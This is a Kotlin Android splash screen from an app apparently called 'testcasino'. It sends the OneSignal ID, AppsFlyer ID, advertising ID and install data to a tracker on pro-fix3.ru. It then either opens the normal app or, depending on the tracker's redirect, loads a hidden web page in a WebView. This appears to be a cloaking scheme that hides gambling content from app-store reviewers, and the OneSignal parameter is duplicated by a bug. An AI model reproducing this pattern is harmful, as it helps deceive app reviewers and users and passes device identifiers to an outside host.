package com.example.testcasino

import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.airbnb.lottie.LottieAnimationView
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.onesignal.OneSignal
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL

class SplashActivity : AppCompatActivity() {

    private var link: String = ""
    private lateinit var linkWithParams: String
    private lateinit var lottieAnimationView: LottieAnimationView
    private lateinit var oneSignalUserId: String

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splash)

        lottieAnimationView = findViewById(R.id.lottieAnimationView)
        lottieAnimationView.playAnimation()

        oneSignalUserId = OneSignal.getDeviceState()?.userId ?: ""
        OneSignal.setExternalUserId(oneSignalUserId)

        link = "https://pro-fix3.ru/click.php?key=1rwy91ciu3w4ff3i51bu&external_onesignal_user_id=$oneSignalUserId"

        initApps()
    }

    private fun initApps() {
        val appsFlyerConversionListener = object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(map: MutableMap<String, Any>?) {
                CoroutineScope(Dispatchers.Main).launch {
                    Log.d("MainActivity", "Coroutine launched")
                    map?.let { conversionData ->
                        linkWithParams = buildLinkWithParams(conversionData)
                        val result = withContext(Dispatchers.IO) { checkLink(linkWithParams) }
                        if (result == "http://ip.jsontest.com" || result == null) {
                            startMainActivity()
                        } else {
                            openWWW(result)
                        }
                    }
                }
            }

            override fun onConversionDataFail(errorMessage: String) {
                Log.e("Appsflyer", "Error getting conversion data: $errorMessage")
            }

            override fun onAppOpenAttribution(attributionData: Map<String, String>) {
                // This is for deep link attributions
            }

            override fun onAttributionFailure(errorMessage: String) {
                Log.e("Appsflyer", "Attribution failure: $errorMessage")
            }
        }

        AppsFlyerLib.getInstance()
            .init(AppClass.appsKey, appsFlyerConversionListener, applicationContext)
        AppsFlyerLib.getInstance().start(this)
        AppsFlyerLib.getInstance().setDebugLog(true)
    }

    private fun buildLinkWithParams(conversionData: MutableMap<String, Any>): String {
        val appsflyerId = conversionData["appsflyer_id"]
        val advertisingId = conversionData["advertisingId"]
        val version = conversionData["app_version_name"]
        val status = conversionData["af_status"]
        val siteId = conversionData["af_siteid"]

        return buildString {
            append(link)
            append("&external_onesignal_user_id=$oneSignalUserId")
            if (appsflyerId != null) {
                append("&appsflyer_id=$appsflyerId")
            }
            if (advertisingId != null) {
                append("&advertising_id=$advertisingId")
            }
            if (status != null) {
                append("&type=$status")
            }
            if (version != null) {
                append("&version=$version")
            }
            if (siteId != null) {
                append("&site_id=$siteId")
            }
        }
    }

    private fun startMainActivity() {
        runOnUiThread {
            startActivity(Intent(this@SplashActivity, MainActivity::class.java))
            finish()
        }
    }

    fun openWWW(link: String) {
        val intent = Intent(this, WebActivity::class.java)
        intent.putExtra("link", link)
        startActivity(intent)
        finish()
    }

    private fun checkLink(urlString: String): String? {
        var connection: HttpURLConnection? = null
        return try {
            val url = URL(urlString)
            connection = url.openConnection() as HttpURLConnection
            connection.instanceFollowRedirects = false
            connection.connectTimeout = 5000
            connection.inputStream.bufferedReader().use { it.readLine() }
            val redirectedUrl = connection.getHeaderField("Location")
            Log.d("Redirected URL", redirectedUrl ?: "No redirection")
            redirectedUrl
        } catch (e: Exception) {
            e.printStackTrace()
            null
        } finally {
            connection?.disconnect()
        }
    }
}
